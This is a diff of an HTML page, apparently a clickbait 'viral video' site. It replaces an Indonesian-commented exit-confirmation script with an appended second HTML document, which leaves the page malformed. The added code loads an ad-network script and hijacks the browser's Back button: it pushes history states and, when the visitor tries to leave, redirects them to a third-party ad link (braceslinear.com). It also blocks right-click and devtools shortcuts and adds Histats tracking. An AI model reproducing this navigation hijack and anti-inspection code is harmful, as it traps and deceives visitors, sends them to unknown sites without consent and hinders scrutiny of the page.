@@ -119,128 +119,169 @@
     © 2026 ViralStream Media. All rights reserved.
   </footer>
 
-<script>
-(function () {
-  // --- Konfigurasi sederhana ---
-  var overlayId = 'exit-confirm-overlay';
-  var allowLeave = false; // bila true, navigasi diizinkan
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title> XXXXXXXXXXXX </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-  // --- Fungsi membuat / menghapus overlay konfirmasi ---
-  function createExitOverlay() {
-    if (document.getElementById(overlayId)) return;
-
-    var overlay = document.createElement('div');
-    overlay.id = overlayId;
-    overlay.style.position = 'fixed';
-    overlay.style.left = 0;
-    overlay.style.top = 0;
-    overlay.style.right = 0;
-    overlay.style.bottom = 0;
-    overlay.style.background = 'rgba(0,0,0,0.6)';
-    overlay.style.display = 'flex';
-    overlay.style.alignItems = 'center';
-    overlay.style.justifyContent = 'center';
-    overlay.style.zIndex = 99999;
-    overlay.innerHTML = ''
-      + '<div style="background:#fff;padding:18px;border-radius:8px;max-width:420px;text-align:center;font-family:sans-serif">'
-      + '<h3 style="margin:0 0 8px;font-size:18px">Tunggu sebentar</h3>'
-      + '<p style="margin:0 0 16px;color:#333">Apakah Anda yakin ingin meninggalkan halaman ini?</p>'
-      + '<div style="display:flex;gap:8px;justify-content:center">'
-      + '<button id="exit-confirm-stay" style="padding:8px 12px;border-radius:4px;border:1px solid #ccc;background:#f5f5f5;cursor:pointer">Tetap di sini</button>'
-      + '<button id="exit-confirm-leave" style="padding:8px 12px;border-radius:4px;border:0;background:#007bff;color:#fff;cursor:pointer">Keluar</button>'
-      + '</div>'
-      + '</div>';
-    document.body.appendChild(overlay);
-
-    document.getElementById('exit-confirm-stay').addEventListener('click', function () {
-      // Tutup overlay dan tetap di halaman
-      closeExitOverlay();
-    });
-
-    document.getElementById('exit-confirm-leave').addEventListener('click', function () {
-      // Izinkan navigasi, lalu panggil history.back() agar browser melanjutkan aksi back
-      allowLeave = true;
-      closeExitOverlay();
-      history.back();
-    });
-  }
-
-  function closeExitOverlay() {
-    var el = document.getElementById(overlayId);
-    if (el) el.parentNode.removeChild(el);
-  }
-
-  // --- Deteksi back button menggunakan history API ---
-  // Tambah satu state ekstra sehingga popstate dipicu ketika user menekan Back
-  function enableBackIntercept() {
-    // Pastikan kita tidak menambahkan state berulang di reload
-    try {
-      // Replace current state, kemudian push state baru
-      history.replaceState({at: 'page'}, '', location.href);
-      history.pushState({at: 'page-protect'}, '', location.href);
-    } catch (e) {
-      // beberapa lingkungan bisa melempar (mis. file://), ignore
+  <style>
+    :root{
+      --primary-bg: #09090b;
+      --border-color: #232329;
+      --text-main: #ffffff;
+      --text-footer: #a1a1aa;
+      --accent: #ffd900;
     }
 
-    window.addEventListener('popstate', function (e) {
-      // Jika allowLeave true => biarkan browser kembali normal
-      if (allowLeave) {
-        return;
-      }
+    *{box-sizing:border-box;margin:0;padding:0}
 
-      // tampilkan overlay konfirmasi
-      createExitOverlay();
-
-      // Setelah menampilkan overlay, push state lagi agar Back tetap dapat dipantau
-      try { history.pushState({at: 'page-protect'}, '', location.href); } catch (er) {}
-    });
-  }
-
-  // --- Fallback: beforeunload (opsional, menampilkan dialog konfirmasi generik) ---
-  var enableBeforeUnloadFallback = false; // set true kalau ingin fallback konfirmasi
-  if (enableBeforeUnloadFallback) {
-    window.addEventListener('beforeunload', function (e) {
-      if (!allowLeave) {
-        // Chrome dan sebagian besar browser mengabaikan pesan kustom;
-        // cukup set returnValue untuk memicu dialog.
-        e.preventDefault();
-        e.returnValue = '';
-        return '';
-      }
-    });
-  }
-
-  // --- Tambahan: cegah fullscreen, klik kanan, dan shortcut devtools seperti contoh Anda ---
-  document.addEventListener('fullscreenchange', function () {
-    if (document.fullscreenElement) {
-      // keluar dari fullscreen bila terjadi
-      try { document.exitFullscreen(); } catch (e) {}
+    html,body{
+      height:100%;
+      width:100%;
+      font-family:"Poppins", Arial, sans-serif;
+      background:var(--primary-bg);
+      color:var(--text-main);
+      display:flex;
+      flex-direction:column;
+      min-height:100vh;
+      overflow-x:hidden;
     }
-  });
 
-  (function () {
-    document.addEventListener('contextmenu', function (e) {
-      // allow-context class atau dalam iframe => masih boleh
-      if (!e.target.closest('.allow-context, iframe')) {
-        e.preventDefault();
-      }
-    });
+    header{
+      background:linear-gradient(to bottom,#18181b,#09090b);
+      text-align:center;
+      padding:18px 12px;
+      font-size:1.15rem;
+      font-weight:600;
+      letter-spacing:1px;
+      border-bottom:1px solid var(--border-color);
+      position:sticky;
+      top:0;
+      z-index:10;
+    }
 
-    document.addEventListener('keydown', function (e) {
-      var key = e.key ? e.key.toUpperCase() : '';
-      if (key === 'F12') e.preventDefault();
-      if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(key)) e.preventDefault();
-      if (e.ctrlKey && ['U', 'S'].includes(key)) e.preventDefault();
-    });
-  })();
+    .container{
+      flex:1;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:flex-start;
+      padding:20px 10px;
+      width:100%;
+      max-width:430px;
+      margin:0 auto;
+    }
 
-  // --- Inisialisasi ---
-  document.addEventListener('DOMContentLoaded', function () {
-    enableBackIntercept();
-  });
+    .video-wrap{
+      width:92%;
+      display:flex;
+      justify-content:center;
+      padding:12px;
+    }
 
-})();
+    video{
+      width:80%;
+      max-width:100%;
+      border-radius:12px;
+      background:#000;
+      box-shadow:0 4px 20px rgba(0,0,0,.5);
+      border:1px solid var(--border-color);
+      outline:none;
+      display:block;
+    }
+
+    footer{
+      background:linear-gradient(to bottom,#18181b,#09090b);
+      text-align:center;
+      padding:15px 0;
+      font-size:.9rem;
+      color:var(--text-footer);
+      border-top:1px solid var(--border-color);
+    }
+
+    @media (max-width:420px){
+      header{font-size:1rem;padding:14px 10px}
+      video{width:92%}
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+<script type="text/javascript">
+	atOptions = {
+		'key' : 'e3390cf0a8cdf953ded85bdaaf3046a5',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
 </script>
+<script type="text/javascript" src="//www.highperformanceformat.com/e3390cf0a8cdf953ded85bdaaf3046a5/invoke.js"></script>
+  </header>
+
+  <main class="container">
+    <div class="video-wrap" aria-label="Video player">
+      <video
+        controls
+        playsinline
+        muted
+        controlslist="nodownload nofullscreen noremoteplayback"
+        disablepictureinpicture>
+        <source src="https://cdn.videy.co/XxTpttJB1.mp4" type="video/mp4" />
+      </video>
+    </div>
+  </main>
+
+  <footer>
+    © 2026 ViralStream Media. All rights reserved.
+  </footer>
+
+  <script type="text/javascript">
+    (function() {
+        const directLink = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";
+
+        function lockAndRedirect() {
+            history.pushState(null, null, location.href);
+            
+            window.onpopstate = function() {
+                window.location.replace(directLink);
+            };
+        }
+
+        window.addEventListener('load', lockAndRedirect);
+
+        document.addEventListener('touchstart', function() {
+            history.pushState(null, null, location.href);
+        }, { once: true });
+        
+        document.addEventListener('click', function() {
+            history.pushState(null, null, location.href);
+        }, { once: true });
+    })();
+  </script>
+
+  <script>
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase()))) e.preventDefault();
+    });
+  </script>
+
+	<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4992245,4,511,95,18,00000000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4992245&101" alt="" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 
 </body>
 </html>
